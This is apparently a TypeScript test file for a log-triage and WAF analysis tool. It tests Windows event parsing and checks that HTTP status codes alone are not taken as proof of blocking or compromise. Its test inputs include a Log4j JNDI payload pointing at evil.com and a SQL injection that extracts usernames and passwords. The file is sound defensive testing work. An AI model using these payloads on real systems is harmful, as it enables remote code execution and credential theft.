import {
  splitRawTextIntoEvents,
  extractWindowsDetails,
  generateTailoredExtraInfo,
  WINDOWS_SUBSTATUS_MAP,
  WINDOWS_LOGON_TYPE_MAP,
  WINDOWS_EVENT_NAMES,
} from '../services/quickTriageHelper';
import {
  initializeFormatState,
  feedSampleLine,
  parseLineToNormalizedLog,
} from '../services/streamingParser';
import { analyzeRawLogText } from '../services/quickLogAnalyzer';
import { parseCountValue } from '../services/policyComparisonEngine';
import { extractUniversalEvidence } from '../services/universalEvidenceExtractor';

let passed = 0;
let total = 0;

function assert(condition: boolean, name: string, detail?: string) {
  total++;
  if (condition) {
    passed++;
    console.log(`[PASS] ${name}`);
  } else {
    console.error(`[FAIL] ${name} - ${detail || 'Assertion failed'}`);
    process.exitCode = 1;
  }
}

console.log('=== QUICK TRIAGE & WINDOWS LOG VALIDATION TESTS ===\n');

// TEST 1: Windows Event 4625 Syslog line extraction
const win4625Syslog = '<13>Sep 18 10:14:22 dc01 Microsoft-Windows-Security-Auditing: [4625] An account failed to log on. Account Name: tekin.yilmaz, Workstation: PC-FINANS-04, Source Network Address: 192.168.10.55, Source Port: 54120, Logon Type: 10, SubStatus: 0xC000006A';
const state1 = initializeFormatState('test_win.log');
feedSampleLine(state1, win4625Syslog);
const parsed1 = parseLineToNormalizedLog(win4625Syslog, state1);

assert(state1.isWindowsEvent === true, 'Test 1.1: Format state identifies Windows Event Log');
assert(parsed1 !== null && parsed1.http_method === 'EVENT-4625', 'Test 1.2: NormalizedLog has EVENT-4625 method');
assert(parsed1?.ip_adresi === '192.168.10.55', 'Test 1.3: Extracted client IP is 192.168.10.55');
assert(parsed1?.kullanici_adi === 'tekin.yilmaz', 'Test 1.4: Extracted user is tekin.yilmaz');

const details1 = extractWindowsDetails(win4625Syslog, {}, parsed1);
assert(details1.isWindowsEvent === true, 'Test 1.5: extractWindowsDetails recognizes Windows Event');
assert(details1.eventId === 4625, 'Test 1.6: Event ID is 4625');
assert(details1.targetUser === 'tekin.yilmaz', 'Test 1.7: Target user is tekin.yilmaz');
assert(details1.workstation === 'PC-FINANS-04', 'Test 1.8: Workstation is PC-FINANS-04');
assert(details1.logonType === 10, 'Test 1.9: Logon Type is 10 (RDP)');
assert(details1.subStatus === '0XC000006A', 'Test 1.10: SubStatus is 0xC000006A');
assert(details1.subStatusDesc.includes('Hatalı Parola'), 'Test 1.11: SubStatusDesc maps to Hatalı Parola');

// TEST 2: Multiline Windows Event Viewer block splitting & parsing
const multilineEvent = `Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          18.09.2026 14:22:10
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
User:          N/A
Computer:      DC01.sirket.local
Description:
An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			10

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		ahmet.demir
	Account Domain:		SIRKET

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC000006A

Network Information:
	Workstation Name:	LAPTOP-AHMET
	Source Network Address:	10.20.30.40
	Source Port:		61234`;

const splitEvents = splitRawTextIntoEvents(multilineEvent);
assert(splitEvents.length === 1, 'Test 2.1: Multiline event is treated as 1 single event block, not 30 separate lines');

const details2 = extractWindowsDetails(splitEvents[0], {}, null);
assert(details2.eventId === 4625, 'Test 2.2: Event ID parsed from multiline is 4625');
assert(details2.targetUser === 'ahmet.demir', 'Test 2.3: Target user parsed from Account For Which Logon Failed is ahmet.demir');
assert(details2.workstation === 'LAPTOP-AHMET', 'Test 2.4: Workstation is LAPTOP-AHMET');
assert(details2.computer === 'DC01.sirket.local', 'Test 2.5: Computer is DC01.sirket.local');
assert(details2.sourceIp === '10.20.30.40', 'Test 2.6: Source IP is 10.20.30.40');
assert(details2.sourcePort === '61234', 'Test 2.7: Source Port is 61234');
assert(details2.logonType === 10, 'Test 2.8: Logon Type is 10');
assert(details2.subStatus === '0XC000006A', 'Test 2.9: SubStatus is 0xC000006A');

// TEST 3: Windows Event 1102 (Audit Log Cleared)
const win1102Log = 'Microsoft-Windows-Security-Auditing: [1102] The audit log was cleared. Subject: Account Name: admin_sec, Computer: DC01';
const details3 = extractWindowsDetails(win1102Log, {}, null);
assert(details3.eventId === 1102, 'Test 3.1: Event ID is 1102');
assert(details3.mitreTechnique === 'T1070.001 (Clear Windows Event Logs)', 'Test 3.2: MITRE technique is T1070.001');

// TEST 4: Dynamic Customer Extra Info Questions (Never Static or Repeating)
const info4625 = generateTailoredExtraInfo({
  isWindows: true,
  winDetails: details1,
  attackVector: 'WINDOWS_4625',
  srcIp: '192.168.10.55',
  dstIp: '10.0.0.1',
  dstPort: '3389',
  logTime: '18.09.2026 10:14:22',
  targetHost: 'DC01',
  requestUrl: '',
  wafAction: 'DENY',
  sigSubclass: 'Audit Failure',
  matchedPattern: '',
});

const infoLog4j = generateTailoredExtraInfo({
  isWindows: false,
  winDetails: { isWindowsEvent: false } as any,
  attackVector: 'LOG4J',
  srcIp: '45.33.32.156',
  dstIp: '192.168.1.100',
  dstPort: '443',
  logTime: '18.09.2026 11:00:00',
  targetHost: 'portal.company.com',
  requestUrl: '${jndi:ldap://evil.com/a}',
  wafAction: 'DROP',
  sigSubclass: 'Log4j RCE',
  matchedPattern: '${jndi:ldap',
});

const infoTimeout = generateTailoredExtraInfo({
  isWindows: false,
  winDetails: { isWindowsEvent: false } as any,
  attackVector: 'TIMEOUT',
  srcIp: '10.10.10.5',
  dstIp: '10.20.30.40',
  dstPort: '8080',
  logTime: '18.09.2026 12:00:00',
  targetHost: 'api.internal',
  requestUrl: '',
  wafAction: 'TIMEOUT',
  sigSubclass: 'Session Timeout',
  matchedPattern: '',
});

assert(info4625.length >= 3, 'Test 4.1: Windows 4625 generates 3+ specific questions');
assert(info4625[0].includes('tekin.yilmaz'), 'Test 4.2: Question explicitly references user "tekin.yilmaz"');
assert(info4625[1].includes('SMB Mapped Drive') || info4625[1].includes('Credential Manager'), 'Test 4.3: Question mentions cached credentials / SMB mapped drive');
assert(infoLog4j[0].includes('Java') && infoLog4j[0].includes('Log4j'), 'Test 4.4: Log4j question specifically asks about Java & Log4j versions');
assert(infoTimeout[0].includes('ayakta') || infoTimeout[0].includes('dinleme modunda'), 'Test 4.5: Timeout question asks if the target port is listening / alive');
assert(JSON.stringify(info4625) !== JSON.stringify(infoLog4j), 'Test 4.6: Questions are strictly distinct and non-static');

// -------------------------------------------------------------
// PHASE 1 — MANDATORY FORENSIC HARDENING & WAF 403 REGRESSIONS
// -------------------------------------------------------------

// TEST 5: "GET /admin/panel ... 403" — WAF bloklaması otomatik olarak doğrulanmamalı
const logAdmin403 = '192.168.1.50 - - [10/Oct/2026:10:00:00 +0000] "GET /admin/panel HTTP/1.1" 403 512 "-" "Mozilla/5.0"';
const resAdmin403 = analyzeRawLogText(logAdmin403);
assert(resAdmin403 !== null, 'Test 5.1: Admin 403 log parses successfully');
assert(resAdmin403?.analysisResults[0].verdict !== 'BLOCKED_ATTACK_ATTEMPT', 'Test 5.2: HTTP 403 alone must NEVER be classified as BLOCKED_ATTACK_ATTEMPT');
assert(!resAdmin403?.analysisResults[0].threatTitle.toLowerCase().includes('engellenen olay'), 'Test 5.3: Threat title must not claim WAF blocked event for generic 403');
assert(resAdmin403?.analysisResults[0].action === '' || resAdmin403?.analysisResults[0].action === 'Belirtilmemiş', 'Test 5.4: Synthetic BLOCK action must not be fabricated');

// TEST 6: Aynı istek + açık "action=block" — bloklama yalnızca eylem alanının kaynağı ve anlamı doğrulandığında tanınmalı
const logAdminBlock = '192.168.1.50 - - [10/Oct/2026:10:00:00 +0000] "GET /admin/panel HTTP/1.1" 403 512 action=block';
const resAdminBlock = analyzeRawLogText(logAdminBlock);
assert(resAdminBlock !== null, 'Test 6.1: Log with explicit action parses');
assert(resAdminBlock?.analysisResults[0].verdict === 'BLOCKED_ATTACK_ATTEMPT', 'Test 6.2: Explicit action=block is correctly recognized as BLOCKED_ATTACK_ATTEMPT');
assert(resAdminBlock?.analysisResults[0].action.toLowerCase() === 'block', 'Test 6.3: Action is verified as block');

// TEST 7: "403" + SQL injection göstergesi — saldırı göstergesi ile engelleme sonucu birbirinden ayrılmalı
const logSqli403 = '192.168.1.50 - - [10/Oct/2026:10:00:00 +0000] "GET /items?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 403 0';
const resSqli403 = analyzeRawLogText(logSqli403);
assert(resSqli403 !== null, 'Test 7.1: SQLi log parses');
assert(resSqli403?.analysisResults[0].threatTitle.includes('SQL Enjeksiyonu'), 'Test 7.2: Attack indicator is accurately detected');
assert(resSqli403?.analysisResults[0].verdict !== 'BLOCKED_ATTACK_ATTEMPT', 'Test 7.3: HTTP 403 + SQLi without explicit WAF action must not claim BLOCKED_ATTACK_ATTEMPT');
assert(resSqli403?.analysisResults[0].verdict === 'SUSPICIOUS_ANOMALY', 'Test 7.4: Verdict reflects suspicious anomaly requiring investigation');
assert(resSqli403?.analysisResults[0].summaryReason.includes('HTTP 403 yanıtı tek başına WAF engellemesi olduğunu kanıtlamaz'), 'Test 7.5: Summary reason explicitly separates HTTP 403 from WAF block');

// TEST 8: "200" + SQL injection göstergesi — HTTP 200 tek başına saldırı başarısı olarak yorumlanmamalı
const logSqli200 = '192.168.1.50 - - [10/Oct/2026:10:00:00 +0000] "GET /items?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 4096';
const resSqli200 = analyzeRawLogText(logSqli200);
assert(resSqli200 !== null, 'Test 8.1: SQLi with 200 parses');
assert(resSqli200?.analysisResults[0].verdict !== 'POTENTIAL_COMPROMISE', 'Test 8.2: HTTP 200 alone must not claim successful compromise');
assert(resSqli200?.analysisResults[0].summaryReason.includes('HTTP 200 yanıtı tek başına'), 'Test 8.3: Summary reason explicitly states 200 does not prove compromise');

// TEST 9: Açık WAF "drop" eylemi — mevcut veri şemasının desteklediği koşullarda bloklama tanınmalı
const logWafDrop = 'CEF:0|Fortinet|FortiWeb|7.0|1000|SQL Injection|8|src=198.51.100.22 dst=10.0.0.5 msg=union select action=drop';
const resWafDrop = analyzeRawLogText(logWafDrop);
assert(resWafDrop !== null, 'Test 9.1: FortiWeb log parses');
assert(resWafDrop?.analysisResults[0].verdict === 'BLOCKED_ATTACK_ATTEMPT', 'Test 9.2: Explicit WAF drop action is recognized as BLOCKED_ATTACK_ATTEMPT');
assert(resWafDrop?.analysisResults[0].action.toLowerCase() === 'drop', 'Test 9.3: Action is drop');

// TEST 10: Eylem alanı bulunmayan kayıt — "BLOCK" veya eşdeğer değer uydurulmamalı
const logNormal200 = '192.168.1.50 - - [10/Oct/2026:10:00:00 +0000] "GET /products/123 HTTP/1.1" 200 1200';
const resNormal200 = analyzeRawLogText(logNormal200);
assert(resNormal200 !== null, 'Test 10.1: Standard web log parses');
assert(resNormal200?.analysisResults[0].action === '', 'Test 10.2: Action field remains empty string when absent, never synthetic BLOCK or DENY');

const univEvidence = extractUniversalEvidence(logAdmin403);
assert(univEvidence.action.status === 'NOT_PRESENT' || univEvidence.action.value === null, 'Test 10.3: UniversalEvidence marks absent action as NOT_PRESENT');
assert(univEvidence.outcome.value !== 'BLOCKED', 'Test 10.4: UniversalEvidence outcome is not BLOCKED for HTTP 403 without action');

// TEST 11: Eksik alanlar — "null", "undefined" ve gerçek "0" değerleri birbirinden ayrılmalı
assert(parseCountValue(0) === 0, 'Test 11.1: Numeric 0 is strictly preserved as 0');
assert(parseCountValue('0') === 0, 'Test 11.2: String "0" is strictly preserved as 0');
assert(parseCountValue(null) === null, 'Test 11.3: null is strictly preserved as null');
assert(parseCountValue(undefined) === null, 'Test 11.4: undefined is strictly preserved as null');
assert(parseCountValue('') === null, 'Test 11.5: empty string is strictly preserved as null');

console.log(`\nSonuç: ${passed}/${total} test başarıyla tamamlandı!`);
if (passed !== total) process.exit(1);
